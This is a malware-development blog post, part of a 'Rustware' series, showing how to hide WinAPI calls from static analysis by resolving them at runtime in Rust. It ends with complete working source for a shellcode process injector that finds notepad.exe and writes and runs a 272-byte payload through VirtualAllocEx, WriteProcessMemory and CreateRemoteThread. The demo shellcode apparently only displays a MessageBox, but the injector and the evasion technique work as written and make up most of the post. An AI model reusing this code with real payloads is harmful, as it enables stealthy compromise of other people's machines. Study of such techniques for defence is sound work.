---
title:  "Rustware Part 3: Dynamic API resolution (Windows)"
authors: ["Raffaele Sabato"]
date:   2023-11-20
tags: ["rust","malwares"]
thumbnail:
  url: img/2023-11-20-rustware-part-3-dynamic-api-resolution/img0.png
  author: Deep AI
  authorURL: https://deepai.org
---

In the [previous blog post](https://syrion.me/malware/rustware-part-2-process-enumeration-development/) we have seen how to perform a shellcode process injection by finding a target process PID using several WinAPIs, in that case all the WinAPIs were called directly. Usually malwares resolve the WinAPI address at runtime in order to hide malicious behaviours during static analysis.

I have to thank **[Jacopo](https://github.com/p1tsi)** for his feedbacks, he helped me to improve the code.

In this blog post we will see how to use two well-known WinAPIs to dynamically resolve the WinAPIs Address: **GetModuleHandle** used to get a module address and **GetProcessAddress** used to get a WinAPI address.



## Runtime API Resolution

The API resolution we are going to develop is very simple and relies on two WinAPIs:

* **[GetModuleHandleA](https://learn.microsoft.com/it-it/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)**: retrieves a module handle of the specified module
* **[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)**: gets the address of a specified function in a DLL

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img1.png" caption="Figure 1 - API Resolution" wrapper="text-center">}}

## Rustware Setup

Everything we need to develop a Rust program that leverages on WinAPI, is well described in the Microsoft “[Developing with Rust on Windows](https://learn.microsoft.com/en-us/windows/dev-environment/rust/)”. In our case, we used the following software, plugins and crate:

* Visual Studio Code 1.83.0
* Rust-analyzer 0.3.1689
* CodeLLDB 1.10.0
* Crates 0.6.3
* Windows Crate 0.51.1

## Rustware Development

First of all, it is necessary to add the Windows Crate and the features required by each WinAPI to the **Cargo.toml** file; we can see the features in the [Windows Crate documentation](https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/LibraryLoader/fn.GetModuleHandleA.html).

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img2.png" caption="Figure 2 - GetModuleHandleA Specification" wrapper="text-center">}}

The new two WinAPIs we are going to use require the following features:

* **GetModuleHandleA**: "Win32_System_LibraryLoader" and "Win32_Foundation"
* **GetProcAddress**: Win32_System_LibraryLoader" and "Win32_Foundation"

After adding the Windows Crate and all the WinAPIs features, the **Cargo.toml** file will look like this.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img3.png" caption="Figure 3 - Cargo.toml File" wrapper="text-center">}}

Each feature must also be imported in the code; we can achieve this with the **use** declaration as shown in the code below.

```rust
use std::{
    ffi::c_void,
    mem::{size_of, transmute},
    ptr::null_mut,
};

use std::ptr::null;

use windows::{
    core::{Error, HRESULT, HSTRING, PCSTR},
    Win32::{
        Foundation::BOOL,
        Foundation::HANDLE,
        Foundation::HMODULE,
        Security::SECURITY_ATTRIBUTES,
        System::{
            Diagnostics::ToolHelp::*,
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::*,
            Threading::*,
        },
    },
};
```

The **resolve_api** function takes two parameters, a **HMODULE** returned from **GetModuleHandleA** and the WinAPI name, it returns the function address or an error. 

```rust
fn resolve_api(
    module_handle: HMODULE,
    api_name: &str,
) -> Result<unsafe extern "system" fn() -> isize, Error>

```

Since **GetProcAddress** is an **unsafe** function, we must use it in an **unsafe** block. In the following code we can see that the **GetProcAddress** takes the **HMODULE** and a **PCSTR** string (rappresenting the WinAPI name) as arguments and returns the WinAPI address or an error.

```rust
fn resolve_api(
    module_handle: HMODULE,
    api_name: &str,
) -> Result<unsafe extern "system" fn() -> isize, Error> {
    unsafe {
        match GetProcAddress(module_handle, PCSTR::from_raw(api_name.as_ptr())) {
            Some(winapi_addr) => {
                return Ok(winapi_addr);
            }
            None => {
                return Err(Error::new(
                    HRESULT(-1),
                    HSTRING::from("GetProcAddress Error"),
                ));
            }
        }
    }
}
```

In order to use the return value from the **resolve_api** function, we need to define the WinAPI function pointer for all the WinAPIs we are going to use in the shellcode process injection; We can do it in Rust with the **[type](https://doc.rust-lang.org/std/keyword.type.html)** keyword. Each WinAPI is defined as an **unsafe [extern](https://doc.rust-lang.org/beta/reference/items/external-blocks.html) “system”** function.

For the **[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)**, we can define a type **OpenProcessAPI** that is an **unsafe extern “system”** fuction, based on the Microsoft Documentation, it gets three parameters: a **PROCESS_ACCESS_RIGHTS**, a **bool** and a 32-bit unsigned integer, and return a **HANDLE**. 

```rust
type OpenProcessFunc = unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, bool, u32) -> HANDLE;
```

We can define the **type** for all the WinAPIs as shown in the code below.

```rust
type CreateToolhelp32SnapshotApi =
    unsafe extern "system" fn(CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32) -> HANDLE;

type Process32FirstApi = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> BOOL;

type Process32NextApi = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> BOOL;

type OpenProcessApi = unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, bool, u32) -> HANDLE;

type CloseHandleApi = unsafe extern "system" fn(HANDLE) -> BOOL;

type VirtualAlloExApi = unsafe extern "system" fn(
    HANDLE,
    *const ::core::ffi::c_void,
    usize,
    VIRTUAL_ALLOCATION_TYPE,
    PAGE_PROTECTION_FLAGS,
) -> *mut c_void;

type WriteProcessMemoryApi =
    unsafe extern "system" fn(HANDLE, *const c_void, *const c_void, usize, *mut usize) -> BOOL;

type VirtualProtectExApi = unsafe extern "system" fn(
    HANDLE,
    *const c_void,
    usize,
    PAGE_PROTECTION_FLAGS,
    *mut PAGE_PROTECTION_FLAGS,
) -> BOOL;

type CreateRemoteThreadApi = unsafe extern "system" fn(
    HANDLE,
    *const SECURITY_ATTRIBUTES,
    usize,
    LPTHREAD_START_ROUTINE,
    *const ::core::ffi::c_void,
    u32,
    *mut u32,
) -> HANDLE;
```

I changed the **get_pid** and the **inject** functions in order to return a **Result**, because of this I used the **?** operator in the expression that returns a **Result** (as **GetModuleHandleA** and **transmute**), in this way we can handle all the errors in the **main** function.

```rust
fn find_pid(target_process_name: &str) -> Result<u32, Error>
fn inject(pid: u32, payload_ptr: *const c_void, payload_len: usize) -> Result<(), Error>
```

The **main** function was changed too, you can see the full code at the end of the blog post.

At this point we can get the kernel32 handle with **GetModuleHandleA**, if everything is ok the **kernel32_module_handle** variable will have the module address otherwise the **main** function will handle the error.

```rust
let kernel32_module_handle: HMODULE =
            GetModuleHandleA(PCSTR::from_raw("kernel32.dll\0".as_ptr()))?;
```

For each WinAPI, we must create a variable of the **type** we defined before and **transmute** the address returned by our **resolve_api** function.

```rust
create_toolhelp32_snapshot = transmute(resolve_api(
            kernel32_module_handle,
            "CreateToolhelp32Snapshot\0",
        )?);
        process32_first = transmute(resolve_api(
            kernel32_module_handle,
            "Process32First\0",
        )?);
        process32_next = transmute(resolve_api(kernel32_module_handle, "Process32Next\0")?);
        close_handle = transmute(resolve_api(kernel32_module_handle, "CloseHandle\0")?);

let open_process: OpenProcessFunc = transmute(resolve_api(kernel32_module_handle, "OpenProcess\0")?);
        virtual_alloc_ex = transmute(resolve_api(
            kernel32_module_handle,
            "VirtualAllocEx\0",
        )?);

        write_process_memory = transmute(resolve_api(
            kernel32_module_handle,
            "WriteProcessMemory\0",
        )?);

        virtual_protect_ex = transmute(resolve_api(
            kernel32_module_handle,
            "VirtualProtectEx\0",
        )?);
        create_remote_thread = transmute(resolve_api(
            kernel32_module_handle,
            "CreateRemoteThread\0",
        )?);
```

At this point, we can call the WinAPIs, for example we can execute **OpenProcess** as shown below.

```rust
let handle_process: HANDLE = open_process(PROCESS_ALL_ACCESS, false, pid);
```

Using the **target** flag, we can specify the i686 architecture and compile the program into a 32bit binary.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img4.png" caption="Figure 4 - Compile Program for 32bit architecture" wrapper="text-center">}}

Running it, it successfully resolves the WinAPI, finds the notepad.exe PID and injects our MessageBox into it.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img5.png" caption="Figure 5 - MessageBox Process Injection in Notepad.exe" wrapper="text-center">}}

## Debugging

Using Process Hacker and x32dbg we can debug our binary to understand how it works under the hood. We set the breakpoints on the **GetModuleHandleA** and **GetProcAddress** WinAPI.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img6.png" caption="Figure 6 - x32dbg Breakpoints" wrapper="text-center">}}

### GetModuleHandleA 
```rust
GetModuleHandleA(PCSTR::from_raw("kernel32.dll\0".as_ptr()))?;
```
Running the debugger, we step on the **GetModuleHandleA**, we can see that it gets one parameter, the “kernel32.dll” string address.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img7.png" caption="Figure 7 - GetModuleHandleA Debug" wrapper="text-center">}}

**GetModuleHandleA** returns the value **0x76740000**, so we can confirm it is the **kernel32.dll** module address by looking at its address using ProcessHacker.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img8.png" caption="Figure 8 - Rustware Modules" wrapper="text-center">}}

### GetProcAddress
```rust
resolve_api(kernel32_module_handle,"CreateToolhelp32Snapshot\0")
```
Taking the **CreateToolhelp32Snapshot** as example, we can see the two parameters for GetProcAddress:
* **0x76740000** is the **kernel32.dll** module address
* **0x98F378** is the "CreateTool32helpSnapshot" string address.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img9.png" caption="Figure 9 - GetProcAddress CreateToolhelp32Snapshot Debug" wrapper="text-center">}}

The same happens for the remaining WinAPIs as shown in the following images.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img10.png" caption="Figure 10 - GetProcAddress Process32First Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img11.png" caption="Figure 11 - GetProcAddress Process32Next Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img12.png" caption="Figure 12 - GetProcAddress CloseHandle Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img13.png" caption="Figure 13 - GetProcAddress OpenProcess Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img14.png" caption="Figure 14 - GetProcAddress VirtualAllocEx Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img15.png" caption="Figure 15 - GetProcAddress WriteProcessMemory Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img16.png" caption="Figure 16 - GetProcAddress VirtualProtectEx Debug" wrapper="text-center">}}

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img17.png" caption="Figure 17 - GetProcAddress CreateRemoteThread Debug" wrapper="text-center">}}

We can see that our binary correctly resolved all the WinAPIs addresses.

{{< image src="img/2023-11-20-rustware-part-3-dynamic-api-resolution/img18.png" caption="Figure 18 - Process Injection Debug" wrapper="text-center">}}

## Conclusion

Rust is a very powerful language; in the last years it found its way into the malware development, especially for ransomware because of its speed. The interaction with WinAPIs is not very easy because of the datatype mismatch.

I had several problems to define the correct function pointer type because I wasn’t defining it as **external “system”** and it wasn’t working.

The next steps are to encrypt all the strings and implement a custom version of **GetModuleHandle** and **GetProcAddress**.

Feel free to contact me, I’d appreciate any feedback.

## References

* [https://learn.microsoft.com/en-us/windows/dev-environment/rust/](https://learn.microsoft.com/en-us/windows/dev-environment/rust/)
* [https://microsoft.github.io/windows-docs-rs/doc/windows/](https://microsoft.github.io/windows-docs-rs/doc/windows/)
* [https://socradar.io/why-ransomware-groups-switch-to-rust-programming-language/](https://socradar.io/why-ransomware-groups-switch-to-rust-programming-language/)
* [https://crates.io/crates/windows](https://crates.io/crates/windows)
* [https://doc.rust-lang.org/book/](https://doc.rust-lang.org/book/)
* [https://www.ired.team/offensive-security/code-injection-process-injection/process-injection](https://www.ired.team/offensive-security/code-injection-process-injection/process-injection)
* [https://institute.sektor7.net](https://institute.sektor7.net)
* [https://maldevacademy.com](https://maldevacademy.com)
* [https://syrion.me/malware/rustware-part-2-process-enumeration-development/](https://syrion.me/malware/rustware-part-2-process-enumeration-development/)
* [https://attack.mitre.org/techniques/T1027/007/](https://attack.mitre.org/techniques/T1027/007/)

## Final Code

```rust
use std::{
    ffi::c_void,
    mem::{size_of, transmute},
    ptr::null_mut,
};

use std::ptr::null;

use windows::{
    core::{Error, HRESULT, HSTRING, PCSTR},
    Win32::{
        Foundation::BOOL,
        Foundation::HANDLE,
        Foundation::HMODULE,
        Security::SECURITY_ATTRIBUTES,
        System::{
            Diagnostics::ToolHelp::*,
            LibraryLoader::{GetModuleHandleA, GetProcAddress},
            Memory::*,
            Threading::*,
        },
    },
};

type CreateToolhelp32SnapshotFunc =
    unsafe extern "system" fn(CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32) -> HANDLE;

type Process32FirstFunc = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> BOOL;

type Process32NextFunc = unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32) -> BOOL;

type OpenProcessFunc = unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, bool, u32) -> HANDLE;

type CloseHandleFunc = unsafe extern "system" fn(HANDLE) -> BOOL;

type VirtualAlloExFunc = unsafe extern "system" fn(
    HANDLE,
    *const ::core::ffi::c_void,
    usize,
    VIRTUAL_ALLOCATION_TYPE,
    PAGE_PROTECTION_FLAGS,
) -> *mut c_void;

type WriteProcessMemoryFunc =
    unsafe extern "system" fn(HANDLE, *const c_void, *const c_void, usize, *mut usize) -> BOOL;

type VirtualProtectExFunc = unsafe extern "system" fn(
    HANDLE,
    *const c_void,
    usize,
    PAGE_PROTECTION_FLAGS,
    *mut PAGE_PROTECTION_FLAGS,
) -> BOOL;

type CreateRemoteThreadFunc = unsafe extern "system" fn(
    HANDLE,
    *const SECURITY_ATTRIBUTES,
    usize,
    LPTHREAD_START_ROUTINE,
    *const ::core::ffi::c_void,
    u32,
    *mut u32,
) -> HANDLE;


fn resolve_api(
    module_handle: HMODULE,
    api_name: &str,
) -> Result<unsafe extern "system" fn() -> isize, Error> {
    unsafe {
        match GetProcAddress(module_handle, PCSTR::from_raw(api_name.as_ptr())) {
            Some(winapi_addr) => {
                return Ok(winapi_addr);
            }
            None => {
                return Err(Error::new(
                    HRESULT(-1),
                    HSTRING::from("GetProcAddress Error"),
                ));
            }
        }
    }
}

fn find_pid(target_process_name: &str) -> Result<u32, Error> {
    let mut pe32: PROCESSENTRY32 = PROCESSENTRY32 {
        ..Default::default()
    };
    let mut cur_process_name;

    let create_toolhelp32_snapshot: CreateToolhelp32SnapshotFunc;
    let process32_first: Process32FirstFunc;
    let process32_next: Process32NextFunc;
    let close_handle: CloseHandleFunc;

    pe32.dwSize = size_of::<PROCESSENTRY32>() as u32;

    unsafe {
        let kernel32_module_handle: HMODULE =
            GetModuleHandleA(PCSTR::from_raw("kernel32.dll\0".as_ptr()))?;

        create_toolhelp32_snapshot = transmute(resolve_api(
            kernel32_module_handle,
            "CreateToolhelp32Snapshot\0",
        )?);
        process32_first = transmute(resolve_api(kernel32_module_handle, "Process32First\0")?);
        process32_next = transmute(resolve_api(kernel32_module_handle, "Process32Next\0")?);
        close_handle = transmute(resolve_api(kernel32_module_handle, "CloseHandle\0")?);

        /* CreateToolhelp32Snapshot */
        let handle_procsnap = create_toolhelp32_snapshot(TH32CS_SNAPPROCESS, 0);
        if handle_procsnap.is_invalid() {
            return Err(Error::new(
                HRESULT(-1),
                HSTRING::from("CreateToolhelp32Snapshot Error"),
            ));
        }

        /* Process32First */
        if process32_first(handle_procsnap, &mut pe32) == false {
            return Err(Error::new(
                HRESULT(-1),
                HSTRING::from("Process32First Error"),
            ));
        }

        loop {
            cur_process_name = std::str::from_utf8(&pe32.szExeFile)
                .unwrap()
                .trim_matches(char::from(0));

            if cur_process_name.to_lowercase() == target_process_name.to_lowercase() {
                println!("Find {target_process_name} PID: {}", pe32.th32ProcessID);
                if close_handle(handle_procsnap).as_bool() == false {
                    return Err(Error::new(HRESULT(-1), HSTRING::from("CloseHandle Error")));
                }
                return Ok(pe32.th32ProcessID);
            }
            pe32.szExeFile = [0; 260];

            /* Process32Next */
            if process32_next(handle_procsnap, &mut pe32) == false {
                if close_handle(handle_procsnap).as_bool() == false {
                    return Err(Error::new(HRESULT(-1), HSTRING::from("CloseHandle Error")));
                }
                break;
            }
        }
    }
    Ok(0)
}

fn inject(pid: u32, payload_ptr: *const c_void, payload_len: usize) -> Result<(), Error> {
    let lp_number_of_bytes_written: *mut usize = std::ptr::null_mut();

    let _lp_thread_id: *mut u32;

    let _lp_parameter: *const c_void;

    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);

    let virtual_alloc_ex: VirtualAlloExFunc;
    let write_process_memory: WriteProcessMemoryFunc;
    let virtual_protect_ex: VirtualProtectExFunc;
    let create_remote_thread: CreateRemoteThreadFunc;

    let close_handle: CloseHandleFunc;

    unsafe {
        let kernel32_module_handle: HMODULE =
            GetModuleHandleA(PCSTR::from_raw("kernel32.dll\0".as_ptr()))?;

        let open_process: OpenProcessFunc =
            transmute(resolve_api(kernel32_module_handle, "OpenProcess\0")?);
        virtual_alloc_ex = transmute(resolve_api(kernel32_module_handle, "VirtualAllocEx\0")?);

        write_process_memory =
            transmute(resolve_api(kernel32_module_handle, "WriteProcessMemory\0")?);

        virtual_protect_ex = transmute(resolve_api(kernel32_module_handle, "VirtualProtectEx\0")?);
        create_remote_thread =
            transmute(resolve_api(kernel32_module_handle, "CreateRemoteThread\0")?);

        close_handle = transmute(resolve_api(kernel32_module_handle, "CloseHandle\0")?);

        /* OpenProcess */
        let handle_process: HANDLE = open_process(PROCESS_ALL_ACCESS, false, pid);

        if handle_process.is_invalid() {
            return Err(Error::new(HRESULT(-1), HSTRING::from("OpenProcess Error")));
        }

        /* VirtualAllocEx */
        let remote_memory_ptr: *mut c_void = virtual_alloc_ex(
            handle_process,
            null(),
            payload_len,
            MEM_COMMIT,
            PAGE_READWRITE,
        );

        if remote_memory_ptr.is_null() {
            return Err(Error::new(
                HRESULT(-1),
                HSTRING::from("VirtualAllocEx Error"),
            ));
        }

        println!("Allocated Memory Address: {:p}", remote_memory_ptr);

        /* WriteProcessMemory */
        if write_process_memory(
            handle_process,
            remote_memory_ptr,
            payload_ptr,
            payload_len,
            lp_number_of_bytes_written,
        ) == false
        {
            return Err(Error::new(
                HRESULT(-1),
                HSTRING::from("WriteProcessMemory Error"),
            ));
        }

        /* VirtualProtectEx */
        if virtual_protect_ex(
            handle_process,
            remote_memory_ptr,
            payload_len,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == false
        {
            return Err(Error::new(
                HRESULT(-1),
                HSTRING::from("VirtualProtectEx Error"),
            ));
        }

        /* CreateRemoteThread */
        let handle_tread = create_remote_thread(
            handle_process,
            transmute(::std::ptr::null::<SECURITY_ATTRIBUTES>()),
            transmute(null::<usize>()),
            transmute(remote_memory_ptr),
            null(),
            transmute(null::<u32>() as u32),
            null_mut(),
        );

        if handle_tread.is_invalid() {
            return Err(Error::new(
                HRESULT(-1),
                HSTRING::from("VirtualProtectEx Error"),
            ));
        }

        /* CloseHandle */
        if close_handle(handle_process).as_bool() == false {
            return Err(Error::new(HRESULT(-1), HSTRING::from("CloseHandle Error")));
        }
        if close_handle(handle_tread).as_bool() == false {
            return Err(Error::new(HRESULT(-1), HSTRING::from("CloseHandle Error")));
        }
    }
    Ok(())
}
fn main() {
    let payload: [u8; 272] = [
        0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31, 0xc9, 0x64, 0x8b,
        0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b, 0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b,
        0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3, 0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24,
        0x24, 0x8b, 0x45, 0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a,
        0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0,
        0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c,
        0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a, 0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a,
        0x1c, 0x01, 0xeb, 0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2,
        0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec, 0x52, 0xe8, 0x9f,
        0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0x7e, 0xd8, 0xe2, 0x73, 0x87, 0x1c, 0x24, 0x52,
        0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89, 0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33,
        0x32, 0x2e, 0x64, 0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89,
        0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d, 0xbc, 0x87, 0x1c,
        0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x58, 0x20, 0x20, 0x20, 0x68, 0x77, 0x61,
        0x72, 0x65, 0x68, 0x52, 0x75, 0x73, 0x74, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x08, 0x89, 0xe3,
        0x68, 0x6e, 0x58, 0x20, 0x20, 0x68, 0x63, 0x74, 0x69, 0x6f, 0x68, 0x49, 0x6e, 0x6a, 0x65,
        0x68, 0x65, 0x73, 0x73, 0x20, 0x68, 0x50, 0x72, 0x6f, 0x63, 0x31, 0xc9, 0x88, 0x4c, 0x24,
        0x11, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0, 0x31, 0xc0, 0x50, 0xff,
        0x55, 0x08,
    ];

    let payload_ptr: *const c_void = payload.as_ptr() as *const c_void;
    let payload_len = payload.len();

    match find_pid("notepad.exe") {
        Ok(pid) => match pid {
            1..=u32::MAX => match inject(pid, payload_ptr, payload_len) {
                Ok(()) => println!("Process Injection Completed"),
                Err(e) => println!("{e}"),
            },
            0 => println!("Process not found"),
        },
        Err(e) => println!("Error: {e}"),
    }
}
```
